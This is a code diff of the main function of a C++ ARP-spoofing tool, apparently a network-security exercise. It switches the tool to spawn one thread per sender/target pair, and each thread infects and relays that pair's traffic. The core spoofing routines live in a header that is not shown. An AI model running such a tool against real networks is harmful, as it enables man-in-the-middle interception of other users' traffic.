@@ -1,5 +1,3 @@
-#include <vector>
-#include <thread>
 #include "my-func.h"
 
 int main(int argc, char* argv[]) {
@@ -22,28 +20,24 @@ int main(int argc, char* argv[]) {
     printf("Attacker IP: %s\n", std::string(attacker.ip).c_str());
 
     // threads
-    std::vector<std::thread> tasks;
+    int pair_cnt = (argc-2)/2;
+    Pair pairs[pair_cnt];
+    std::thread tasks[pair_cnt];
 
-    int cnt = 0;
+    // allocate thread per pair
+    int idx = 0;
     for (int i=2;i<argc;i+=2){
-        printf("\n======Pair %d======\n", ++cnt);
-        Pair pair;
-        pair.sip = Ip(argv[i]);
-        pair.tip = Ip(argv[i+1]);
+        pairs[idx].sip =Ip(argv[i]);
+        pairs[idx].tip= Ip(argv[i+1]);
 
-        // get sender MAC
-        pair.smac = get_smac(handle, pair);
-        printf("Sender MAC: %s\n", std::string(pair.smac).c_str());
+        tasks[idx] = std::thread(task, handle, std::ref(pairs[idx]));
+        ++idx;
+    }
 
-        // infect
-        infect(handle, pair);
-        printf("Sender infected\n");
-
-        // reinfect & relay
-        std::thread task = std::thread(arp_spoof, handle);
-        tasks.push_back(task);
+    for (std::thread& task : tasks){
         task.join();
     }
+
     pcap_close(handle);
     return 0;
 }
